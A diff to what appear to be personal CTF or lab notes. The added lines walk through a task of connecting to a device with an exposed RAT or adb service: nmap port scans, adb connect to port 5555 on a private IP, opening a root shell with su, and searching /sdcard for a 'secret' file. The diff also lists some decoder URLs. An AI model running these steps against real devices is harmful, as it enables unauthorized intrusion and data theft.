@@ -1234,8 +1234,12 @@ check for Incoming Bytes higher + many times for same ip = 192.168.10.222
 A RAT server is installed on a server. Connect with it and access the file secret:
 nmap -p- 192.168.X.X   # Replace with the target IP address
 nmap -p 5555 192.168.X.X --open
-
-find / -name "secret"
+adb connect 192.168.10.121:5555
+adb shell
+su
+cd /sdcard
+find /sdcard -name "secret"
+find /sdcard -iname "secret*"
 cp /path/to/secret /tmp/secret_copy
 dir /a:h (hidden files w2k)
 -----------------------------------------------------------------------------------------------------------
@@ -1629,6 +1633,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
